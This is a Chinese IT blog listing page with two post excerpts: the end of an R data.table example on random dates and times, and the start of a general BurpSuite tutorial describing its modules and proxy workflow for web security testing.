&gt; date &lt;- as.Date('2018-8-26') + 0:09 &gt; hour &lt;- sample(1:24, 10) &gt; minute &lt;- sample(1:60, 10) &gt; second &lt;- sample(1:60, 10) &gt; days &lt;- data.table(date, hour, minute, second) &gt; days date hour minute second 1: 2018-08-26 5 3 39 2: 2018-08-27 2 56 24 3: 2018-08-28 20 59 1 4: 2018-08-29 7 30 8 5: 2018-08-30 14 18 31 6: 2018-08-31 8 43 53 7: 2018-09-01 12 13 2 8: 2018-09-02 10 36 7 9: 2018-09-03 22 21 47 10: 2018-09-04 1 2 26 连续使用管道 ；可以分开使用
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34f76f96e40056cba404fd6f2be18acf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50101cdd40193a4bab35a0ea354440a4/" rel="bookmark">
			BurpSuite实例教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很久以前就看到了Burp suite这个工具了，当时感觉好NB，但全英文的用起来很是蛋疼，网上也没找到什么教程，就把这事给忘了。今天准备开始好好学习这个渗透神器，也正好给大家分享下。（注：内容大部分是百度的，我只是分享下自已的学习过程）
https://www.ctftools.com/down/
什么是BurpSuite Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。 Burp Suite 能高效率地与单个工具一起工作，例如： 一个中心站点地图是用于汇总收集到的目标应用程序信息，并通过确定的范围来指导单个程序工作。 在一个工具处理HTTP 请求和响应时，它可以选择调用其他任意的Burp工具。例如： 代理记录的请求可被Intruder 用来构造一个自定义的自动攻击的准则，也可被Repeater 用来手动攻击，也可被Scanner 用来分析漏洞，或者被Spider(网络爬虫)用来自动搜索内容。应用程序可以是“被动地”运行，而不是产生大量的自动请求。Burp Proxy 把所有通过的请求和响应解析为连接和形式，同时站点地图也相应地更新。由于完全的控制了每一个请求，你就可以以一种非入侵的方式来探测敏感的应用程序。 当你浏览网页(这取决于定义的目标范围)时，通过自动扫描经过代理的请求就能发现安全漏洞。 IburpExtender 是用来扩展Burp Suite 和单个工具的功能。一个工具处理的数据结果，可以被其他工具随意的使用，并产生相应的结果。 BurpSuite工具箱 Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。 Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。 Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。 Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。 Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。 Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。 Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 BurpSuite的使用 当Burp Suite 运行后，Burp Proxy 开起默认的8080 端口作为本地代理接口。通过置一个web 浏览器使用其代理服务器，所有的网站流量可以被拦截，查看和修改。默认情况下，对非媒体资源的请求将被拦截并显示(可以通过Burp Proxy 选项里的options 选项修改默认值)。对所有通过Burp Proxy 网站流量使用预设的方案进行分析，然后纳入到目标站点地图中，来勾勒出一张包含访问的应用程序的内容和功能的画面。在Burp Suite 专业版中，默认情况下，Burp Scanner是被动地分析所有的请求来确定一系列的安全漏洞。 在你开始认真的工作之前，你最好为指定工作范围。最简单的方法就是浏览访问目标应用程序，然后找到相关主机或目录的站点地图，并使用上下菜单添加URL 路径范围。通过配置的这个中心范围，能以任意方式控制单个Burp 工具的运行。 当你浏览目标应用程序时，你可以手动编辑代理截获的请求和响应，或者把拦截完全关闭。在拦截关闭后，每一个请求，响应和内容的历史记录仍能再站点地图中积累下来。 和修改代理内截获的消息一样，你可以把这些消息发送到其他Burp 工具执行一些操作： 你可以把请求发送到Repeater,手动微调这些对应用程序的攻击，并重新发送多次的单独请求。 [专业版]你可以把请求发送到Scanner,执行主动或被动的漏洞扫描。 你可以把请求发送到Intruer，加载一个自定义的自动攻击方案，进行确定一些常规漏洞。 如果你看到一个响应，包含不可预知内容的会话令牌或其他标识符，你可以把它发送到Sequencer 来测试它的随机性。 当请求或响应中包含不透明数据时，可以把它发送到Decoder 进行智能解码和识别一些隐藏的信息。 [专业版]你可使用一些engagement 工具使你的工作更快更有效。 你在代理历史记录的项目，单个主机，站点地图里目录和文件，或者请求响应上显示可以使用工具的任意地方上执行任意以上的操作。 可以通过一个中央日志记录的功能，来记录所单个工具或整个套件发出的请求和响应。 这些工具可以运行在一个单一的选项卡窗口或者一个被分离的单个窗口。所有的工具和套件的配置信息是可选为通过程序持久性的加载。在Burp Suite 专业版中，你可以保存整个组件工具的设置状态，在下次加载过来恢复你的工具。 burpsuite专业版的个人感受 不知不觉使用burpsuite也有点年头了。它在我日常进行安全评估，它已经变得日益重要。 现在已经变成我在日常渗透测试中不可缺少的工具之一。burpsuite官方现在已经更新到1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/50101cdd40193a4bab35a0ea354440a4/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/247/">«</a>
	<span class="pagination__item pagination__item--current">248/279</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/249/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>